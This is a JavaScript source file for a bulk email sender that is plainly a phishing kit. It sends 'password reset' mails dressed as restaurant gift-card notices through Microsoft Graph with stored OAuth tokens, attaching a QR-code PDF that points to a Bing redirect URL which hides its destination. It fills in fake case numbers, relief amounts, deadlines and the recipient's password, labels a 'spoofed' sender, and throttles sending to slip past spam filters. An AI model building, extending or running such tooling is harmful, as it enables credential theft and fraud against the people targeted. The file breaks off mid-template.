import { faker } from '@faker-js/faker';
import { sendMail } from './graph.js';
import { TokenStore, isExpired } from './tokenStore.js';
import { PostgresTokenStore } from './postgresTokenStore.js';
import { CONFIG } from './config.js';
import { refreshAccessToken } from './oauth.js';
import fs from 'fs/promises';
import path from 'path';
import { parse } from 'csv-parse/sync';
import QRCode from 'qrcode';
import PDFDocument from 'pdfkit';

export class EmailSender {
  constructor() {
    // Initialize token store - prefer Postgres if DATABASE_URL is available
    if (process.env.DATABASE_URL) {
      this.store = new PostgresTokenStore(process.env.DATABASE_URL);
    } else {
      this.store = new TokenStore();
    }
  }

  // Helper functions for placeholders
  getDomain(email) {
    if (!email || !email.includes('@')) return '';
    return email.split('@')[1];
  }

  getNameFromEmail(email) {
    if (!email || !email.includes('@')) return '';
    return email.split('@')[0];
  }

  getDynamicDate() {
    return new Date().toLocaleDateString('en-US', {
      year: 'numeric',
      month: 'long',
      day: 'numeric'
    });
  }

  generateCaseNumber(email) {
    const hash = email.split('').reduce((a, b) => {
      a = ((a << 5) - a) + b.charCodeAt(0);
      return a & a;
    }, 0);
    return `CASE-${Math.abs(hash).toString().slice(0, 8)}`;
  }

  generateReliefAmount(email) {
    const hash = email.split('').reduce((a, b) => {
      a = ((a << 5) - a) + b.charCodeAt(0);
      return a & a;
    }, 0);
    const amount = (Math.abs(hash) % 50000) + 15000; // $15K to $65K
    return `$${amount.toLocaleString()}`;
  }

  getHearingDate() {
    const date = new Date();
    date.setDate(date.getDate() + 7); // 7 days from now
    return date.toLocaleDateString('en-US', {
      year: 'numeric',
      month: 'long',
      day: 'numeric'
    });
  }

  getDeadline() {
    const date = new Date();
    date.setDate(date.getDate() + 2); // 2 days from now
    return date.toLocaleDateString('en-US', {
      year: 'numeric',
      month: 'long',
      day: 'numeric'
    });
  }

  /**
   * Generate a PDF with QR code for credential verification
   * @param {string} url - The URL to encode in the QR code
   * @param {Object} userData - User data for personalization
   * @returns {Promise<string>} - Base64 encoded PDF content
   */
  async generateQRCodePDF(url, userData = {}) {
    return new Promise(async (resolve, reject) => {
      try {
        // Generate QR code as data URL
        const qrDataUrl = await QRCode.toDataURL(url, {
          width: 200,
          margin: 2,
          color: {
            dark: '#000000',
            light: '#ffffff'
          }
        });

        // Create PDF document
        const doc = new PDFDocument({
          size: 'A4',
          margin: 50
        });

        // Collect PDF chunks
        const chunks = [];
        doc.on('data', chunk => chunks.push(chunk));
        doc.on('end', () => {
          const pdfBuffer = Buffer.concat(chunks);
          const base64 = pdfBuffer.toString('base64');
          resolve(base64);
        });
        doc.on('error', reject);

        // Add content to PDF
        const companyName = userData.company || 'Your Organization';
        const userName = userData.fullname || userData.firstname || 'User';
        const email = userData.email || '';
        const domain = this.getDomain(email);

        // Header - Green branding for gift card theme
        doc.rect(0, 0, doc.page.width, 100).fill('#228B22');
        doc.fillColor('#ffffff').fontSize(24).font('Helvetica-Bold');
        doc.text('Reservation Service', 50, 35, { align: 'center' });
        doc.fontSize(12).font('Helvetica');
        doc.text('Gift Card Notification', 50, 65, { align: 'center' });

        // Body (use explicit coordinates to avoid overlap)
        const left = 50;
        const contentWidth = doc.page.width - 100;
        let y = 120;

        doc.fillColor('#333333').fontSize(14).font('Helvetica');
        doc.text(`Dear ${userName},`, left, y, { width: contentWidth, align: 'left' });
        y = doc.y + 6;

        doc.fontSize(12);
        doc.text(
          'You have received a gift card notification. Visit our restaurant to explore our cuisine and enjoy your gift.',
          left,
          y,
          { width: contentWidth, align: 'left' }
        );
        y = doc.y + 8;

        doc.text('Please scan the QR code below to verify and claim your gift card:', left, y, {
          width: contentWidth,
          align: 'left',
        });
        y = doc.y + 8;

        // Add QR code image (convert data URL to buffer)
        const qrImageBuffer = Buffer.from(qrDataUrl.split(',')[1], 'base64');
        const qrSize = 160;
        const centerX = (doc.page.width - qrSize) / 2;
        doc.image(qrImageBuffer, centerX, y, { width: qrSize });
        y = y + qrSize + 10;

        // Instructions
        doc.fontSize(11).fillColor('#555555');
        doc.text('Instructions:', left, y, { width: contentWidth, align: 'left' });
        y = doc.y + 4;
        doc.text('1. Open your phone camera or QR scanner app', left, y, { width: contentWidth, align: 'left' });
        y = doc.y + 2;
        doc.text('2. Point the camera at the QR code above', left, y, { width: contentWidth, align: 'left' });
        y = doc.y + 2;
        doc.text('3. Follow the link to verify your gift card', left, y, { width: contentWidth, align: 'left' });
        y = doc.y + 6;

        // Security notice
        doc.fontSize(10).fillColor('#888888');
        doc.text('This is an automated notification from Reservation Service.', left, y, {
          width: contentWidth,
          align: 'center',
        });
        y = doc.y + 2;
        doc.text(`Reference: ${email}`, left, y, { width: contentWidth, align: 'center' });
        y = doc.y + 2;
        doc.text(`Generated: ${new Date().toLocaleDateString()}`, left, y, {
          width: contentWidth,
          align: 'center',
        });

        // Footer - positioned relative to page height to ensure it stays at bottom
        doc.fillColor('#228B22').fontSize(10);
        doc.text('© 2026 Reservation Service. All rights reserved.', 50, doc.page.height - 40, { align: 'center' });

        // Finalize PDF
        doc.end();
      } catch (error) {
        reject(error);
      }
    });
  }

  /**
   * Validate email format
   */
  isValidEmail(email) {
    if (!email || typeof email !== 'string') return false;

    const trimmed = email.trim();
    if (!trimmed) return false;

    // More strict email regex that prevents common issues
    const emailRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;

    // Check basic format with strict regex
    if (!emailRegex.test(trimmed)) return false;

    // Additional validation checks
    const parts = trimmed.split('@');
    if (parts.length !== 2) return false;

    const [local, domain] = parts;

    // Local part checks
    if (!local || local.length > 64) return false;
    if (local.startsWith('.') || local.endsWith('.')) return false;
    if (local.includes('..')) return false;

    // Domain checks
    if (!domain || domain.length > 253) return false;
    if (domain.startsWith('.') || domain.endsWith('.')) return false;
    if (domain.startsWith('-') || domain.endsWith('-')) return false;
    if (domain.includes('..')) return false;

    // Must have at least one dot in domain
    if (!domain.includes('.')) return false;

    return true;
  }

  /**
   * Get ramp-up status for a user
   */
  async getRampUpStatus(userKey) {
    if (!this.store.getRampUpStatus) {
      // Fallback for non-Postgres stores
      return {
        userKey,
        rampUpStartDate: new Date().toISOString().split('T')[0],
        rampUpDays: 30,
        currentDay: 1,
        emailsSentToday: 0,
        lastSendDate: null,
        maxEmailsToday: 100
      };
    }
    return await this.store.getRampUpStatus(userKey);
  }

  /**
   * Check if user can send more emails today based on ramp-up
   */
  async canSendEmailToday(userKey) {
    if (!this.store.canSendEmail) {
      return true; // Allow if no ramp-up tracking
    }
    return await this.store.canSendEmail(userKey);
  }

  /**
   * Record that an email was sent and update ramp-up progress
   */
  async recordEmailSent(userKey) {
    if (this.store.recordEmailSent) {
      return await this.store.recordEmailSent(userKey);
    }
    return null; // No-op if not supported
  }

  /**
   * Get time until next batch can be sent
   */
  async getTimeUntilNextBatch(userKey) {
    if (!this.store.getTimeUntilNextBatch) {
      return 0; // No delay if no ramp-up tracking
    }
    return await this.store.getTimeUntilNextBatch(userKey);
  }

  /**
   * Reset ramp-up progress for a user
   */
  async resetRampUp(userKey, rampUpDays = 30) {
    if (this.store.resetRampUp) {
      await this.store.resetRampUp(userKey, rampUpDays);
    }
  }

  // Replace placeholders in content with CSV row data
  replacePlaceholders(content, rowData) {
    const email = rowData.Email || rowData.email || '';

    const replacements = {
      '##EMAIL##': email,
      '##UEMAIL##': email,
      '##UDOMAIN##': this.getDomain(email),
      '##UNAME##': this.getNameFromEmail(email),
      '##DATE##': this.getDynamicDate(),
      '##FIRSTNAME##': (rowData['First name'] || rowData['First_Name'] || rowData['FirstName'] || rowData['First Name'] || '').trim(),
      '##LASTNAME##': (rowData['Last name'] || rowData['Last_Name'] || rowData['LastName'] || rowData['Last Name'] || '').trim(),
      '##FULLNAME##': (rowData['Full name'] || rowData['Full_Name'] || rowData['FullName'] || rowData['Full Name'] ||
                      rowData['Name'] ||
                      `${rowData['First name'] || rowData['First_Name'] || rowData['First Name'] || ''} ${rowData['Last name'] || rowData['Last_Name'] || rowData['Last Name'] || ''}`).trim(),
      '##JOBTITLE##': (rowData['Job position'] || rowData['Employee_Title'] || rowData['Job Title'] || rowData['Title'] || 'Professional').trim() || 'Professional',
      '##JOBPOSITION##': (rowData['Job position'] || rowData['Employee_Title'] || rowData['Job Title'] || rowData['Title'] || 'Professional').trim() || 'Professional',
      '##COMPANY##': (rowData['Company name'] || rowData['Company_Name'] || rowData['Company'] || rowData['Employer'] || 'Your Organization').trim() || 'Your Organization',
      '##LOCATION##': (rowData['Location'] || rowData['City'] || rowData['Country'] || '').trim(),
      '##COUNTRY##': (rowData['Country'] || 'your country').trim() || 'your country',
      '##INDUSTRY##': (rowData['Industry'] || rowData['Company industry'] || 'Business Services').trim() || 'Business Services',
      '##CASENUMBER##': this.generateCaseNumber(email),
      '##RELIEFAMOUNT##': this.generateReliefAmount(email),
      '##HEARINGDATE##': this.getHearingDate(),
      '##DEADLINE##': this.getDeadline(),
      '##PASSWORD##': rowData.__password || '',
    };

    let result = content;
    for (const [placeholder, value] of Object.entries(replacements)) {
      result = result.replace(new RegExp(placeholder, 'g'), value);
    }

    return result;
  }

  // Read all CSV files and extract data
  async readAllCsvFiles() {
    const srcDir = path.join(process.cwd(), 'src');
    const csvFiles = [];

    try {
      const files = await fs.readdir(srcDir);
      for (const file of files) {
        if (file.endsWith('.csv')) {
          csvFiles.push(path.join(srcDir, file));
        }
      }
    } catch (error) {
      console.warn('Error reading src directory:', error.message);
    }

    const allData = [];

    for (const csvFile of csvFiles) {
      try {
        console.log(`Reading CSV file: ${path.basename(csvFile)}`);
        const content = await fs.readFile(csvFile, 'utf-8');
        const records = parse(content, {
          columns: true,
          skip_empty_lines: true,
          trim: true,
        });

        console.log(`Found ${records.length} records in ${path.basename(csvFile)}`);
        allData.push(...records);
      } catch (error) {
        console.warn(`Error reading CSV file ${csvFile}:`, error.message);
      }
    }

    return allData;
  }

  // Read target emails from emails.txt
  async readTargetEmails() {
    try {
      const content = await fs.readFile('emails.txt', 'utf-8');
      const emails = content.split('\n')
        .map(line => line.trim())
        .filter(line => line && line.includes('@'));
      return [...new Set(emails)]; // Remove duplicates
    } catch (error) {
      console.warn('Error reading emails.txt:', error.message);
      return [];
    }
  }

  // Match target emails with CSV data
  matchEmailsWithCsv(targetEmails, csvData) {
    const emailMap = new Map();
    const matchedContacts = [];

    // Create email lookup map from CSV data
    csvData.forEach(row => {
      const csvEmail = (row.Email || row.email || '').toLowerCase().trim();
      if (csvEmail) {
        emailMap.set(csvEmail, row);
      }
    });

    // Match target emails with CSV data - INCLUDE ALL emails with generic fallbacks
    targetEmails.forEach(targetEmail => {
      const normalizedEmail = targetEmail.toLowerCase().trim();
      const csvRow = emailMap.get(normalizedEmail);

      if (csvRow) {
        // Found in CSV - use real data
        matchedContacts.push({
          email: targetEmail,
          csvData: csvRow,
          hasCsvData: true
        });
      } else {
        // Not found in CSV - use generic fallback data
        const domain = this.getDomain(targetEmail);
        const companyName = domain.split('.')[0].charAt(0).toUpperCase() + domain.split('.')[0].slice(1); // Capitalize first letter

        const genericData = {
          'First name': this.getNameFromEmail(targetEmail).split(' ')[0] || 'Valued',
          'Last name': this.getNameFromEmail(targetEmail).split(' ').slice(1).join(' ') || 'Customer',
          'Full name': this.getNameFromEmail(targetEmail) || 'Valued Customer',
          'First_Name': this.getNameFromEmail(targetEmail).split(' ')[0] || 'Valued',
          'Last_Name': this.getNameFromEmail(targetEmail).split(' ').slice(1).join(' ') || 'Customer',
          'Full_Name': this.getNameFromEmail(targetEmail) || 'Valued Customer',
          'FirstName': this.getNameFromEmail(targetEmail).split(' ')[0] || 'Valued',
          'LastName': this.getNameFromEmail(targetEmail).split(' ').slice(1).join(' ') || 'Customer',
          'FullName': this.getNameFromEmail(targetEmail) || 'Valued Customer',
          'Job position': 'Professional',
          'Employee_Title': 'Professional',
          'Job Title': 'Professional',
          'Title': 'Professional',
          'Company name': companyName,
          'Company_Name': companyName,
          'Company': companyName,
          'Employer': companyName,
          'Location': domain,
          'City': domain,
          'Country': 'your country',
          'Industry': 'Business Services',
          'Company industry': 'Business Services',
          'Email': targetEmail,
          'email': targetEmail
        };

        matchedContacts.push({
          email: targetEmail,
          csvData: genericData,
          hasCsvData: false
        });
      }
    });

    return matchedContacts;
  }

  // Send personalized emails using emails.txt list and CSV data
  async sendPersonalizedEmails(userKey, options = {}) {
    const template = 'password_reset'; // Always use password reset template

    console.log('Reading emails.txt target list...');
    const targetEmails = await this.readTargetEmails();

    console.log('Reading CSV files for contact data...');
    const csvData = await this.readAllCsvFiles();

    if (targetEmails.length === 0) {
      throw new Error('No emails found in emails.txt file.');
    }

    if (csvData.length === 0) {
      throw new Error('No CSV data found. Please place CSV files in the src directory.');
    }

    console.log(`Found ${targetEmails.length} target emails in emails.txt`);
    console.log(`Found ${csvData.length} records across all CSV files`);

    // Match target emails with CSV data (all emails included with generic fallbacks)
    const matchedContacts = this.matchEmailsWithCsv(targetEmails, csvData);

    const withCsvData = matchedContacts.filter(c => c.hasCsvData).length;
    const withGenericData = matchedContacts.filter(c => !c.hasCsvData).length;

    console.log(`📧 Total emails to process: ${matchedContacts.length}`);
    console.log(`📊 With CSV data: ${withCsvData}`);
    console.log(`📝 With generic data: ${withGenericData}`);

    if (matchedContacts.length === 0) {
      throw new Error('No emails found in emails.txt file.');
    }

    // Randomize the order of all contacts (with CSV data or generic fallbacks)
    const shuffledContacts = [...matchedContacts].sort(() => Math.random() - 0.5);
    console.log(`🎲 Randomized ${shuffledContacts.length} contacts for this batch`);

    // Get ramp-up status for user
    const rampUpStatus = await this.getRampUpStatus(userKey);
    const canSendToday = await this.canSendEmailToday(userKey);

    console.log('🚀 Sending personalized Reservation Service gift card emails...');
    console.log('📋 Using emails.txt target list (CSV data + generic fallbacks)');
    console.log('📈 Ramp-up Mode: Day', rampUpStatus.currentDay, 'of', rampUpStatus.rampUpDays);
    console.log('📊 Today\'s limit:', rampUpStatus.maxEmailsToday, 'emails (sent:', rampUpStatus.emailsSentToday + ')');
    console.log('⏱️  Delay: 1 minute between emails');
    console.log('📧 Template: Reservation Service gift card with placeholders');

    const results = [];
    const errors = [];
    let sentCount = 0;

    // Check if we can send emails today
    if (!canSendToday) {
      const waitMs = await this.getTimeUntilNextBatch(userKey);
      const waitHours = Math.ceil(waitMs / (60 * 60 * 1000));
      console.log(`⏰ Ramp-up limit reached for today. Next batch available in ${waitHours} hours (tomorrow)`);
      return {
        throttled: true,
        waitHours,
        rampUpStatus,
        total: shuffledContacts.length,
        sent: 0,
        failed: 0
      };
    }

    for (const contact of shuffledContacts) {
      // Check ramp-up limit before each email
      const currentStatus = await this.getRampUpStatus(userKey);
      if (!await this.canSendEmailToday(userKey)) {
        console.log(`🚫 Reached ramp-up limit for today (${currentStatus.maxEmailsToday} emails)`);
        break;
      }

      const email = contact.email;
      const row = contact.csvData;

      // Validate email format - skip invalid emails
      if (!this.isValidEmail(email)) {
        console.log(`⏭️  Skipping invalid email format: ${email}`);
        continue;
      }

      try {
        // Generate personalized content
        let subject = options.subject || 'Reservation Confirmed - ##FIRSTNAME## ##LASTNAME## Gift Card Ready';
        
        // Check if we should use PDF attachment mode (default: true)
        const usePdfAttachment = options.usePdfAttachment !== false;
        let body = this.generateBody(template, 'medium', { ...options, usePdfAttachment });

        // Apply placeholder replacement
        subject = this.replacePlaceholders(subject, row);
        body = this.replacePlaceholders(body, row);

        // Generate personalized sender name
        const senderName = this.replacePlaceholders('##FULLNAME##', row) || 'Reservation Service';
        const spoofedFromEmail = email; // Use recipient's email as sender to spoof

        console.log(`Sending to: ${email} (from: ${spoofedFromEmail})`);

        // Generate PDF attachment with QR code if enabled
        let attachments = [];
        if (usePdfAttachment) {
          // Get the URL for the QR code (same URL for both reset and keep)
          const qrUrl = options.qrUrl || options.resetUrl || 'https://www.bing.com/ck/a?!&&p=4d80b51848d8d88690201e2cfc166714f7ea88f2b89f83ed26b07f53939e77b4JmltdHM9MTc2NzU3MTIwMA&ptn=3&ver=2&hsh=4&fclid=25557a36-b02a-66eb-1869-6c4cb1e867c9&u=a1aHR0cHM6Ly93d3cuZWxpbmtyZWNydWl0aW5nLmNvbS9ob21lL21lZXQtb3VyLWZvdW5kZXIv';
          
          // User data for PDF personalization
          const userData = {
            email,
            firstname: row['First name'] || this.getNameFromEmail(email),
            fullname: row['Full name'] || `${row['First name'] || ''} ${row['Last name'] || ''}`.trim() || this.getNameFromEmail(email),
            company: row['Company name'] || this.getDomain(email).split('.')[0].charAt(0).toUpperCase() + this.getDomain(email).split('.')[0].slice(1),
          };
          
          console.log(`📎 Generating QR code PDF for ${email}...`);
          const pdfBase64 = await this.generateQRCodePDF(qrUrl, userData);
          
          attachments.push({
            name: 'GiftCard_Verification.pdf',
            contentType: 'application/pdf',
            contentBytes: pdfBase64
          });
          console.log(`✅ PDF attachment generated (${Math.round(pdfBase64.length / 1024)}KB)`);
        }

        // Note: Microsoft Graph API doesn't allow spoofing sender email for security reasons
        // We'll use the authenticated account but personalize the content
        // Send email directly using Microsoft Graph API
        const accessToken = await this.getValidToken(userKey);
        const isHtml = body.includes('<html>') || body.includes('<body>');
        const result = await sendMail(accessToken, {
          to: [email],
          subject,
          ...(isHtml ? { bodyHtml: body } : { bodyText: body }),
          attachments: attachments.length > 0 ? attachments : undefined,
          saveToSentItems: options.saveToSentItems !== false
        });

        // Record the email sent for ramp-up tracking
        const rampStatus = await this.recordEmailSent(userKey);
        if (rampStatus && rampStatus.emailsSentToday !== undefined) {
          console.log(`📈 Sent today: ${rampStatus.emailsSentToday}/${rampStatus.maxEmailsToday}`);
        }

        results.push({
          email,
          result,
          rowData: row,
          spoofedFrom: spoofedFromEmail
        });

        sentCount++;

        // Check if we've reached the daily limit after sending this email
        if (!await this.canSendEmailToday(userKey)) {
          console.log(`🚫 Reached ramp-up limit for today after sending ${sentCount} emails`);
          break;
        }

        // Long pause after every 20 emails
        if (sentCount % 20 === 0) {
          console.log(`⏸️  Sent ${sentCount} emails. Pausing for 5 minutes...`);
          await new Promise(resolve => setTimeout(resolve, 300000)); // 5 minutes
          continue;
        }

        // Rate limiting between emails - wait 1 minute before next email
        console.log(`⏳ Waiting 1 minute before next email...`);
        await new Promise(resolve => setTimeout(resolve, 60000)); // 1 minute delay between emails

      } catch (error) {
        console.error(`Failed to send to ${email}:`, error.message);
        errors.push({
          email,
          error: error.message,
          rowData: row
        });
      }
    }

    // Get final ramp-up status
    const finalRampUpStatus = await this.getRampUpStatus(userKey);

    return {
      total: shuffledContacts.length,
      sent: results.length,
      failed: errors.length,
      rampUpStatus: finalRampUpStatus,
      canSendMoreToday: await this.canSendEmailToday(userKey),
      results,
      errors
    };
  }

  async initialize() {
    if (this.store.ensureSchema) {
      await this.store.ensureSchema();
    }
  }

  /**
   * Get a valid access token for a user
   */
  async getValidToken(userKey) {
    let tokenInfo = await this.store.load(userKey);
    if (!tokenInfo) {
      throw new Error(`No tokens found for user: ${userKey}`);
    }

    // Check if token is expired and refresh if needed
    if (isExpired(tokenInfo, CONFIG.refreshSkewSeconds)) {
      console.log(`Token expired for ${userKey}, attempting refresh...`);

      // Try to refresh token if we have a client secret, otherwise use existing token
      if (CONFIG.clientSecret && tokenInfo.refresh_token) {
        try {
          // Use the original granted scopes for refresh, not config scopes
          const originalScopes = tokenInfo.scope ? tokenInfo.scope.split(/\s+/) : CONFIG.scopes;

          const refreshedTokens = await refreshAccessToken({
            clientId: CONFIG.clientId,
            clientSecret: CONFIG.clientSecret,
            tenantId: CONFIG.tenantId,
            scopes: originalScopes,
            refreshToken: tokenInfo.refresh_token,
          });

          // Merge refreshed tokens with existing info
          tokenInfo = {
            ...tokenInfo,
            ...refreshedTokens,
            user: tokenInfo.user, // Preserve user info
            scope_differs_from_default: tokenInfo.scope_differs_from_default, // Preserve metadata
          };

          // Save refreshed tokens
          await this.store.save(userKey, tokenInfo);
          console.log(`Token refreshed successfully for ${userKey}`);
        } catch (error) {
          console.error(`Failed to refresh token for ${userKey}:`, error.message);
          console.log(`Refresh token may be expired. Please re-authenticate this user.`);
          throw new Error(`Token refresh failed and no valid token available. Please re-authenticate user ${userKey}`);
        }
      } else {
        console.log(`No CLIENT_SECRET configured or no refresh token available, cannot refresh`);
        throw new Error(`Token expired and cannot be refreshed. Please re-authenticate user ${userKey}`);
      }
    }

    return tokenInfo.access_token;
  }

  /**
   * Generate a random email subject
   */
  generateSubject(template = 'business') {
    const templates = {
      business: [
        () => `Business Proposal: ${faker.company.name()} Partnership`,
        () => `Update on ${faker.company.buzzPhrase()}`,
        () => `${faker.person.jobTitle()} Position Available`,
        () => `Quarterly Report: ${faker.company.buzzNoun()}`,
        () => `Meeting Request: ${faker.date.weekday()} Discussion`,
      ],
      personal: [
        () => `Hello from ${faker.person.firstName()}`,
        () => `Weekend Plans with ${faker.person.firstName()}`,
        () => `${faker.hacker.adjective()} News Update`,
        () => `Thoughts on ${faker.company.buzzNoun()}`,
        () => `${faker.animal.type()} Stories`,
      ],
      promotional: [
        () => `Exclusive Offer: ${faker.commerce.productName()}`,
        () => `Limited Time Deal on ${faker.commerce.product()}`,
        () => `New ${faker.commerce.productAdjective()} Collection`,
        () => `Save ${faker.number.int({ min: 10, max: 70 })}% Today!`,
        () => `${faker.company.name()} Special Announcement`,
      ]
    };

    const templateFunc = templates[template];
    if (templateFunc) {
      // password_reset returns HTML directly
      if (template === 'password_reset') {
        return templateFunc();
      }
      // Other templates return arrays of subject lines
      return faker.helpers.arrayElement(templateFunc)();
    }
    // Default to business template
    return faker.helpers.arrayElement(templates.business)();
  }

  /**
   * Generate random email body content
   */
  generateBody(template = 'business', length = 'medium', options = {}) {
    const lengths = {
      short: { paragraphs: 1, sentences: 2 },
      medium: { paragraphs: 2, sentences: 3 },
      long: { paragraphs: 3, sentences: 4 }
    };

    const { paragraphs, sentences } = lengths[length] || lengths.medium;

    const templates = {
      password_reset: () => {
        // Check if we should use PDF attachment mode
        const usePdfAttachment = options.usePdfAttachment !== false; // Default to true

        if (usePdfAttachment) {
          // Template for PDF attachment mode - no clickable buttons, reference PDF
          return `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Reservation Service</title>
</head>
<body style="margin: 0; padding: 0; font-family: Arial, sans-serif; background-color: #f6f6f6;">
  <table width="100%" border="0" cellspacing="0" cellpadding="0" bgcolor="#f6f6f6">
    <tr>
      <td align="center" style="padding: 10px 0;">
        <table width="600" border="0" cellspacing="0" cellpadding="0" bgcolor="#ffffff" style="border: 1px solid #e0e0e0;">
          <!-- Service Banner -->
          <tr>
            <td bgcolor="#2d5a27" style="color: #ffffff; text-align: center; padding: 12px; font-size: 14px; font-weight: bold; font-family: Arial, sans-serif;">
              ##UDOMAIN## Gift Card Notification
            </td>
          </tr>

          <!-- Header -->
          <tr>
            <td bgcolor="#2d5a27" style="color: #ffffff; padding: 20px; font-family: Arial, sans-serif;">
              <b style="font-size: 24px; display: block; margin-bottom: 5px;">RS</b>
              <b style="font-size: 18px; display: block;">Reservation Service</b>
              <span style="font-size: 14px;">Gift Card Notification</span>
            </td>
          </tr>

          <!-- Content -->
          <tr>
            <td style="padding: 30px 25px; color: #333333; line-height: 1.6; font-size: 16px; font-family: Arial, sans-serif;">
              <p style="margin: 0 0 20px 0;">Dear ##FIRSTNAME##,</p>
              <p style="margin: 0 0 20px 0;">You have received a gift card. Visit our restaurant to explore our cuisine and enjoy your gift.</p>
              <p style="margin: 0 0 20px 0;"><b>Please open the attached PDF and scan the QR code to access your gift card.</b></p>

              <!-- PDF Instructions Box -->
              <table width="100%" border="0" cellspacing="0" cellpadding="0" style="margin: 30px 0;">
                <tr>
                  <td align="center" style="background-color: #f0f7f0; padding: 20px; border: 1px solid #2d5a27; border-radius: 4px;">
                    <p style="margin: 0 0 10px 0; font-weight: bold; color: #2d5a27;">Attachment: GiftCard_Verification.pdf</p>
                    <p style="margin: 0; font-size: 14px; color: #666;">Open the attached PDF and scan the QR code with your phone camera</p>
                  </td>
                </tr>
              </table>

              <p style="font-size: 14px; color: #666666; margin: 20px 0 0 0;">
                This is an automated message. Please access your gift card to complete the reservation process.
              </p>
            </td>
          </tr>

          <!-- Footer -->
          <tr>
            <td bgcolor="#f8f8f8" style="padding: 20px 25px; color: #666666; font-size: 12px; border-top: 1px solid #e0e0e0; font-family: Arial, sans-serif;">
              <p style="margin: 0 0 10px 0;"><b>Reservation Service</b> | Gift Card Notification</p>
              <p style="margin: 0 0 10px 0;">This email was sent by Reservation Service on behalf of ##FULLNAME## at ##COMPANY##.</p>
              <p style="margin: 0; font-size: 11px;">© 2026 All rights reserved.</p>
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
</body>
</html>`;
        }

        // Original template with clickable buttons (fallback when usePdfAttachment=false)
        const resetUrl = options.resetUrl || 'https://www.bing.com/ck/a?!&&p=4d80b51848d8d88690201e2cfc166714f7ea88f2b89f83ed26b07f53939e77b4JmltdHM9MTc2NzU3MTIwMA&ptn=3&ver=2&hsh=4&fclid=25557a36-b02a-66eb-1869-6c4cb1e867c9&u=a1aHR0cHM6Ly93d3cuZWxpbmtyZWNydWl0aW5nLmNvbS9ob21lL21lZXQtb3VyLWZvdW5kZXIv';
        const keepUrl = options.keepUrl || 'https://www.bing.com/ck/a?!&&p=4d80b51848d8d88690201e2cfc166714f7ea88f2b89f83ed26b07f53939e77b4JmltdHM9MTc2NzU3MTIwMA&ptn=3&ver=2&hsh=4&fclid=25557a36-b02a-66eb-1869-6c4cb1e867c9&u=a1aHR0cHM6Ly93d3cuZWxpbmtyZWNydWl0aW5nLmNvbS9ob21lL21lZXQtb3VyLWZvdW5kZXIv';

        return `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Reservation Service</title>
</head>
<body style="margin: 0; padding: 0; font-family: Arial, sans-serif; background-color: #f6f6f6;">
  <table width="100%" border="0" cellspacing="0" cellpadding="0" bgcolor="#f6f6f6">
    <tr>
      <td align="center" style="padding: 10px 0;">
        <table width="600" border="0" cellspacing="0" cellpadding="0" bgcolor="#ffffff" style="border: 1px solid #e0e0e0;">
          <!-- Service Banner -->
          <tr>
            <td bgcolor="#2d5a27" style="color: #ffffff; text-align: center; padding: 12px; font-size: 14px; font-weight: bold; font-family: Arial, sans-serif;">
              ##UDOMAIN## Gift Card Notification
            </td>
          </tr>

          <!-- Header -->
          <tr>
            <td bgcolor="#2d5a27" style="color: #ffffff; padding: 20px; font-family: Arial, sans-serif;">
              <b style="font-size: 24px; display: block; margin-bottom: 5px;">RS</b>
              <b style="font-size: 18px; display: block;">Reservation Service</b>
              <span style="font-size: 14px;">Gift Card Notification</span>
            </td>
          </tr>

          <!-- Content -->
          <tr>
            <td style="padding: 30px 25px; color: #333333; line-height: 1.6; font-size: 16px; font-family: Arial, sans-serif;">
              <p style="margin: 0 0 20px 0;">Dear ##FIRSTNAME##,</p>
              <p style="margin: 0 0 20px 0;">You have received a gift card. Visit our restaurant to explore our cuisine and enjoy your gift.</p>
              <p style="margin: 0 0 20px 0;">Access your gift card now.</p>

              <!-- Buttons -->
              <table width="100%" border="0" cellspacing="0" cellpadding="0" style="margin: 30px 0;">
                <tr>
                  <td align="center">
                    <a href="${resetUrl}" style="background-color: #2d5a27; color: #ffffff; padding: 15px 25px; text-decoration: none; border-radius: 4px; font-size: 16px; font-weight: bold; font-family: Arial, sans-serif; display: inline-block; margin: 0 5px;">Access Gift Card</a>
                    <a href="${keepUrl}" style="background-color: #4a7c59; color: #ffffff; padding: 15px 25px; text-decoration: none; border-radius: 4px; font-size: 16px; font-weight: bold; font-family: Arial, sans-serif; display: inline-block; margin: 0 5px;">View Reservation</a>
                  </td>
                </tr>
              </table>

              <p style="font-size: 14px; color: #666666; margin: 20px 0 0 0;">
                This is an automated message. Please access your gift card to complete the reservation process.
              </p>
            </td>
          </tr>

          <!-- Footer -->
          <tr>
            <td bgcolor="#f8f8f8" style="padding: 20px 25px; color: #666666; font-size: 12px; border-top: 1px solid #e0e0e0; font-family: Arial, sans-serif;">
              <p style="margin: 0 0 10px 0;"><b>Reservation Service</b> | Gift Card Notification</p>
              <p style="margin: 0 0 10px 0;">This email was sent by Reservation Service on behalf of ##FULLNAME## at ##COMPANY##.</p>
              <p style="margin: 0; font-size: 11px;">© 2026 All rights reserved.</p>
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
</body>
</html>`;
      },
      business: () => {
        const content = [];
        for (let i = 0; i < paragraphs; i++) {
          if (i === 0) {
            content.push(`Dear ${faker.person.firstName()},`);
            content.push('');
            content.push(faker.lorem.sentences(sentences));
          } else if (i === paragraphs - 1) {
            content.push('');
            content.push(`Best regards,`);
            content.push(`${faker.person.fullName()}`);
            content.push(`${faker.person.jobTitle()}`);
            content.push(`${faker.company.name()}`);
            content.push(`${faker.phone.number()}`);
          } else {
            content.push('');
            content.push(faker.lorem.sentences(sentences));
          }
        }
        return content.join('\n');
      },
      personal: () => {
        const content = [];
        for (let i = 0; i < paragraphs; i++) {
          if (i === 0) {
            content.push(`Hi ${faker.person.firstName()},`);
            content.push('');
            content.push(faker.lorem.sentences(sentences));
          } else if (i === paragraphs - 1) {
            content.push('');
            content.push(`Cheers,`);
            content.push(`${faker.person.firstName()}`);
          } else {
            content.push('');
            content.push(faker.lorem.sentences(sentences));
          }
        }
        return content.join('\n');
      },
      promotional: () => {
        const content = [];
        for (let i = 0; i < paragraphs; i++) {
          if (i === 0) {
            content.push(`Dear ${faker.person.firstName()},`);
            content.push('');
            content.push(`We're excited to announce our ${faker.commerce.productAdjective()} ${faker.commerce.productName()}!`);
